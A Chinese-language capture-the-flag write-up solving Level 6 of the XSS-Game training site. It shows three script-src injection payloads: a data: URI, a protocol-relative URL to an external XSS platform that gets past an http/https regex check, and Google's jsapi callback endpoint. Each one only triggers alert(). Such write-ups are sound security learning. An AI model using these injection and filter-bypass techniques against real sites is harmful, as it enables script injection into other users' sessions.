## [[XSS-Game](https://xss-game.appspot.com/)] [[Level 6 - Follow the rabbit](https://xss-game.appspot.com/level6)] [[解题报告](http://exp-blog.com/2019/02/15/pid-3322/)]

------

## 1. 解题方法一（题目 "BUG"）

明显注入点在 URL。

查看页面源码发现， 无论在 URL 输入什么都会实时回显到 script 标签的 src 属性里面：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/01.png)

即注入点是这样的： `<script src="注入点" ></script>`

要在 script 标签的 src 属性执行 js ，可以构造这样的 payload： `data:text/javascript,alert('exp')`

直接 pass。。最后一关简单到离谱。。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/02.png)


## 2. 解题方法二（XSS 平台）

其实这么简单就突破了，可能是这题的 BUG。

因为我一开始没看题目的 Mission Objective 变成了这样：

**Find a way to make the application request an external file which will cause it to execute an alert().**

即作者期望我们利用 script 标签的 src 属性去调用其他站点的 恶意 js 脚本，再由该脚本回调当前网页 的 alert，估计作者也没想到可以被钻了空子。

------------

若按作者的思路解题，我们可以用 xss 平台做，例如： [http://xss.tf](http://xss.tf)

注册 xss 平台后，任意创建一个项目，然后配置项目源码，勾选最后的“自定义代码”，输入一个 JS 函数 `alert()` ，最后查看项目代码，会给出访问这个项目的 URL，如这里为：[http://xss.tf/IUa](http://xss.tf/IUa)

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/03.png)

打开这个 xss 项目的 URL ： [http://xss.tf/IUa](http://xss.tf/IUa)

可以看见页面只打印了一个 JS 函数 `alert()` ，到这里我们构造这个 xss 平台的目的就完成了。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/04.png)

------------

### 2.1. 回调函数

回到挑战页面，前面已经知道注入点是这样的： `<script src="注入点" ></script>`

要从这里通过 xxs 平台回调 `alert()` 函数，只需要在 URL 末尾加上 `callback=alert`，即：

`<script src="http://xss.tf/gAk?callback=alert" ></script>`

回调原理大概是这样的：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/05.png)


------------

### 2.2. 验证绕过

但是直接注入 `http://xss.tf/gAk?callback=alert` 是无法成功的，

原因是题目对注入点做了正则校验，不允许输入以 http 或 https 开头的内容：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/06.png)

但是绕过的方式也很简单，直接删掉 `http:` 或 `https:` 即可，最终 payload 变成这样：

`//xss.tf/gAk?callback=alert`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/07.png)


在 web 网页中，以双斜杠 `//` 开头的 URL 写法有其特殊用途：

- 它会判断当前的页面协议是 http 还是 https 来决定请求 url 的协议
- 主要用于处理 \[网站使用的协议\] 和 \[网页中请求的外网资源\] 不一致的问题，达到无缝切换
- 这种写法在 CSS 很常见，如：`.omgomg { background: url(//exp-blog.com/imgs/exp.gif); }`


------------

## 3. 解题方法三（谷歌 jsapi）

查看 hits ，题目给出的一个提示是：`google.com/jsapi?callback=foo`

打开页面发现，google 会实时根据 `callback=foo` 的值构造一个 `foo` 函数

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/08.png)

因此可以构造这样的 payload ：`//www.google.com/jsapi?callback=alert`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/09.png)

这样就可以省去自己搭建 xss 平台的麻烦了，一样可以 pass ：

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/10.png)

------------

## 4. 闯关成功

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/11.png)

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/12.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
